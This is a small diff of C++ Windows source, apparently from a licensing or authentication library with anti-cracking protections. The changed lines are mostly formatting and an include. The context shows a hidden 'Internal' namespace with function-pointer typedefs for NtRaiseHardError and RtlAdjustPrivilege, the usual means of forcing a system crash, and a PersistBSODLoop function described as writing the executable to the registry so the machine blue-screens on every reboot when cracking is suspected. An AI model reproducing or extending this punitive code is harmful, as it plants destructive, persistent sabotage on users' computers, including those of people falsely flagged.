@@ -30,6 +30,7 @@
 #include <comdef.h>
 #include <tlhelp32.h>
 #include <intrin.h>
+#include <winternl.h>
 #include <string>
 #include <vector>
 #include <thread>
@@ -67,8 +68,8 @@ struct AuthResult {
 // Only called when active cracking is detected — NOT for auth failures
 namespace Internal {
 
-typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS,ULONG,ULONG,PULONG_PTR,ULONG,PULONG);
-typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
+typedef NTSTATUS (__stdcall *pNtRaiseHardError)  (NTSTATUS,ULONG,ULONG,PULONG_PTR,ULONG,PULONG);
+typedef NTSTATUS (__stdcall *pRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
 
 // Writes exe to registry so BSOD loops on every reboot
 inline void PersistBSODLoop() {
@@ -454,6 +455,8 @@ inline std::string JGet(const std::string& json, const std::string& key) {
     auto e = json.find_first_of(",}", p);
     return json.substr(p, e - p);
 }
+
+} // namespace Internal
 
 // ── PROTECTION 1: CODE INTEGRITY CHECK ───────────────────────────────────────
 // Hashes the running .exe on disk at startup to get baseline.
